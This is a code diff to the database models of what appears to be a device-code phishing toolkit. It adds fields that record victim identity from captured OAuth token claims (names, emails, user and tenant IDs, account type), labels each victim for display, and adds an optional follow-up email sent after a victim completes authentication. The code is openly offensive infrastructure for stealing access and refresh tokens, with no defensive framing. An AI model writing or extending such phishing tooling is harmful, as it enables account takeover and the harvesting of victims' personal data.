@@ -80,6 +80,10 @@ class Campaign(db.Model):
     updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
     # Optional override for public client_id when not using AzureAppConfig.
     public_client_id = db.Column(db.String(256), nullable=True)
+    # Optional follow-up email sent after victim completes device code auth.
+    send_post_auth_email = db.Column(db.Boolean, default=False)
+    post_auth_email_subject = db.Column(db.String(512))
+    post_auth_email_body_html = db.Column(db.Text)
 
     smtp_config = db.relationship("SMTPConfig", backref="campaigns", foreign_keys=[smtp_config_id])
     azure_email_config = db.relationship("AzureAppConfig", foreign_keys=[azure_email_config_id])
@@ -92,6 +96,16 @@ class DeviceCodeSession(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     campaign_id = db.Column(db.Integer, db.ForeignKey("campaigns.id"), nullable=False)
     target_email = db.Column(db.String(256))
+    # Victim identity captured after device code auth (from token claims).
+    user_email = db.Column(db.String(256))
+    user_display_name = db.Column(db.String(256))
+    user_given_name = db.Column(db.String(256))
+    user_family_name = db.Column(db.String(256))
+    user_id = db.Column(db.String(256))
+    tenant_id = db.Column(db.String(256))
+    # personal (MSA / idp=live.com) vs corporate (work/school Azure AD)
+    account_type = db.Column(db.String(32))
+    identity_provider = db.Column(db.String(64))
     # Optional IP address of the client that initiated this session (for API-created sessions).
     source_ip = db.Column(db.String(64))
     user_code = db.Column(db.String(32))  # Code shown to user (e.g. ABCD-1234)
@@ -103,16 +117,42 @@ class DeviceCodeSession(db.Model):
     error_message = db.Column(db.String(1024), nullable=True)  # details when status=error
     email_sent = db.Column(db.Boolean, default=False)
     email_sent_at = db.Column(db.DateTime)
+    post_auth_email_sent = db.Column(db.Boolean, default=False)
+    post_auth_email_sent_at = db.Column(db.DateTime)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
     updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
 
     captured_token = db.relationship("CapturedToken", backref="session", uselist=False, cascade="all, delete-orphan")
+
+    @property
+    def display_target(self):
+        """Best label for the victim/target in UI and notifications."""
+        name = self.user_given_name or self.user_display_name
+        email = self.user_email or self.target_email
+        ct = self.captured_token
+        if not name and ct:
+            name = getattr(ct, "user_given_name", None) or ct.user_display_name
+        if not email and ct:
+            email = ct.user_email
+        uid = self.user_id or (ct.user_id if ct else None)
+        if name and email:
+            return f"{name} ({email})"
+        return name or email or uid or "-"
 
     def to_dict(self):
         return {
             "id": self.id,
             "campaign_id": self.campaign_id,
             "target_email": self.target_email,
+            "user_email": self.user_email,
+            "user_display_name": self.user_display_name,
+            "user_given_name": self.user_given_name,
+            "user_family_name": self.user_family_name,
+            "user_id": self.user_id,
+            "tenant_id": self.tenant_id,
+            "account_type": self.account_type,
+            "identity_provider": self.identity_provider,
+            "display_target": self.display_target,
             "user_code": self.user_code,
             "verification_uri": self.verification_uri,
             "message": self.message,
@@ -121,6 +161,8 @@ class DeviceCodeSession(db.Model):
             "error_message": self.error_message,
             "email_sent": self.email_sent,
             "email_sent_at": self.email_sent_at.isoformat() if self.email_sent_at else None,
+            "post_auth_email_sent": self.post_auth_email_sent,
+            "post_auth_email_sent_at": self.post_auth_email_sent_at.isoformat() if self.post_auth_email_sent_at else None,
             "created_at": self.created_at.isoformat() if self.created_at else None,
         }
 
@@ -137,7 +179,11 @@ class CapturedToken(db.Model):
     user_id = db.Column(db.String(256))
     user_email = db.Column(db.String(256))
     user_display_name = db.Column(db.String(256))
+    user_given_name = db.Column(db.String(256))
+    user_family_name = db.Column(db.String(256))
     tenant_id = db.Column(db.String(256))
+    account_type = db.Column(db.String(32))
+    identity_provider = db.Column(db.String(64))
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
     updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
 
@@ -148,7 +194,11 @@ class CapturedToken(db.Model):
             "user_id": self.user_id,
             "user_email": self.user_email,
             "user_display_name": self.user_display_name,
+            "user_given_name": self.user_given_name,
+            "user_family_name": self.user_family_name,
             "tenant_id": self.tenant_id,
+            "account_type": self.account_type,
+            "identity_provider": self.identity_provider,
             "scope": self.scope,
             "has_refresh_token": bool(self.refresh_token),
             "access_token_expires_at": self.access_token_expires_at.isoformat() if self.access_token_expires_at else None,
